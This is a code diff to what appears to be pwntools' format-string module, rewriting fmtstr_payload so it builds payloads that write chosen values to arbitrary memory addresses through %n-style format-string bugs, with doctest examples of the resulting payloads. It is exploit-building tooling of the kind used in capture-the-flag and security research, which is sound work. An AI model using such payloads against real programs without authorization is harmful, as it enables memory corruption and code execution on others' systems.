@@ -93,6 +93,8 @@ from __future__ import division
 
 import logging
 import re
+from operator import itemgetter
+from collections import namedtuple
 
 from pwnlib.log import getLogger
 from pwnlib.memleak import MemLeak
@@ -101,6 +103,93 @@ from pwnlib.util.fiddling import randoms
 from pwnlib.util.packing import *
 
 log = getLogger(__name__)
+
+SPECIFIER = {
+    1: 'hhn',
+    2: 'hn',
+    4: 'n',
+    8: 'lln',
+}
+
+WRITE_SIZE = {
+    "byte": 1,
+    "short": 2,
+    "int": 4,
+}
+
+def normalize_writes(writes):
+    # make all writes flat
+    writes = { address: flat(data) for address, data in writes.items() }
+
+    # merge adjacent writes (and detect overlaps)
+    merged = []
+    prev_end = -1
+    for address, data in sorted(writes.items(), key=itemgetter(0)):
+        if address < prev_end:
+            raise ValueError("normalize_fmtstr_writes(): data at offset %d overlaps with previous data which ends at offset %d" % (address, prev_end))
+
+        if address == prev_end and merged:
+            merged[-1] = (merged[-1][0], merged[-1][1] + data)
+        else:
+            merged.append((address, data))
+
+        prev_end = address + len(data)
+
+    return merged
+
+# optimization examples (with bytes_written=0)
+#
+# 00 05 00 00     -> %n%5c%n
+# 00 00 05 00 00  -> %n%5c%n
+# 00 00 05 05 00 05  -> need overlapping writes if numbwritten > 5
+
+Atom = namedtuple("FmtAtom", "address data")
+
+def make_atoms_simple(address, data):
+    return [Atom(address + i, d) for i, d in enumerate(data)]
+
+def merge_atoms_size(atoms, maxsize=1):
+    if maxsize <= 1:
+        return atoms
+
+    assert maxsize % 2 == 0, "write size must be power of two"
+    atoms = merge_atoms_size(atoms, maxsize//2)
+    merged = []
+    for atom in atoms:
+        if not merged:
+            merged = [atom]
+            continue
+
+        prev = merged[-1]
+        if len(prev.data) + len(atom.data) != maxsize:
+            merged.append(atom)
+        else:
+            merged[-1] = Atom(prev.address, prev.data + atom.data)
+
+    return merged
+
+def make_payload_dollar(data_offset, atoms, numbwritten=0, countersize=4):
+    data = ""
+    fmt = ""
+
+    counter = numbwritten
+    for idx, atom in enumerate(atoms):
+        sz = len(atom.data)
+
+        # set format string counter to correct value
+        val = unpack(atom.data, 'all')
+        padding = (val - counter) % (1 << (sz * 8))
+        if countersize == 32 and counter > 2147483600:
+            warn("number of written bytes in format string close to 1 << 31. this will likely not work on glibc")
+        counter = (counter + padding) % (1 << (countersize * 8))
+
+        # perform write
+        if padding:
+            fmt += "%" + str(padding) + "c"
+        fmt += "%" + str(data_offset + idx) + "$" + SPECIFIER[sz]
+        data += pack(atom.address)
+
+    return fmt, data
 
 def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
     r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str
@@ -120,64 +209,43 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
     Examples:
         >>> context.clear(arch = 'amd64')
         >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
-        '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
+        '%322419390c%5$n%3972547906c%6$na\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00'
         >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
-        '\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
+        '%47806c%7$hn%22649c%8$hn%60617c%9$hn%10$hnaaaaba\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00'
         >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
-        '\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
+        '%190c%12$hhn%252c%13$hhn%125c%14$hhn%220c%15$hhn%237c%16$hhn%17$hhn%18$hhn%19$hhnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00'
         >>> context.clear(arch = 'i386')
         >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
-        '\x00\x00\x00\x00%322419386c%1$n'
+        '%322419390c%5$na\x00\x00\x00\x00'
         >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
-        '\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
+        '%47806c%7$hn%22649c%8$hn\x00\x00\x00\x00\x02\x00\x00\x00'
         >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
-        '\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
+        '%190c%13$hhn%252c%14$hhn%125c%15$hhn%220c%16$hhn\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00'
 
     """
-
-    # 'byte': (number, step, mask, format, decalage)
-    config = {
-        32 : {
-            'byte': (4, 1, 0xFF, 'hh', 8),
-            'short': (2, 2, 0xFFFF, 'h', 16),
-            'int': (1, 4, 0xFFFFFFFF, '', 32)},
-        64 : {
-            'byte': (8, 1, 0xFF, 'hh', 8),
-            'short': (4, 2, 0xFFFF, 'h', 16),
-            'int': (2, 4, 0xFFFFFFFF, '', 32)
-        }
-    }
 
     if write_size not in ['byte', 'short', 'int']:
         log.error("write_size must be 'byte', 'short' or 'int'")
 
-    number, step, mask, formatz, decalage = config[context.bits][write_size]
+    all_atoms = []
+    for address, data in normalize_writes(writes):
+        atoms = make_atoms_simple(address, data)
+        atoms = merge_atoms_size(atoms, WRITE_SIZE[write_size])
 
-    # add wheres
-    payload = ""
-    for where, what in writes.items():
-        for i in range(0, number*step, step):
-            payload += pack(where+i)
+        all_atoms += atoms
 
-    numbwritten += len(payload)
-    fmtCount = 0
-    for where, what in writes.items():
-        for i in range(0, number):
-            current = what & mask
-            if numbwritten & mask <= current:
-                to_add = current - (numbwritten & mask)
-            else:
-                to_add = (current | (mask+1)) - (numbwritten & mask)
+    fmt = ""
+    for iteration in xrange(1000000):
+        data_offset = len(fmt) // context.bytes
+        fmt, data = make_payload_dollar(offset + data_offset, all_atoms)
+        fmt = fmt + cyclic((-len(fmt)) % context.bytes)
 
-            if to_add != 0:
-                payload += "%{}c".format(to_add)
-            payload += "%{}${}n".format(offset + fmtCount, formatz)
+        if len(fmt) == data_offset * context.bytes:
+            break
+    else:
+        raise RuntimeError("this is a bug ... format string building did not converge")
 
-            numbwritten += to_add
-            what >>= decalage
-            fmtCount += 1
-
-    return payload
+    return fmt + data
 
 class FmtStr(object):
     """
@@ -298,7 +366,7 @@ class FmtStr(object):
             >>> f = FmtStr(send_fmt_payload, offset=5)
             >>> f.write(0x08040506, 0x1337babe)
             >>> f.execute_writes()
-            '\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn'
+            '%190c%17$hhn%252c%18$hhn%125c%19$hhn%220c%20$hhn\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08'
 
         """
         self.writes[addr] = data
